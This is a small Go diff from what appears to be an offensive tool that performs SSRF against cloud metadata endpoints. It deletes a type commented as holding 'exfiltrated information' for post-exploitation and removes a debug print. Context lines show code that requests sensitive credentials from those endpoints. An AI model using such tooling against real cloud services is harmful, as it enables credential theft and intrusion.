@@ -10,9 +10,6 @@ import (
 // All cloud metadata endpoints we support to perform SSRF against
 type MetadataEndpoints map[string]*CloudSsrf
 
-// Exfiltrated information that we can use for post-exploitation
-type SsrfResults map[string]string
-
 type CloudSsrf struct {
 	// HTTP client to interact with endpoints
 	Client *http.Client
@@ -147,7 +144,6 @@ func GetMetadataEndpoints() MetadataEndpoints {
 
 					// new request to now retrieve sensitive credentials
 					url := url + string(body)
-					fmt.Println(url)
 					req, err := http.NewRequest("GET", url, nil)
 					if err != nil {
 						return "", err
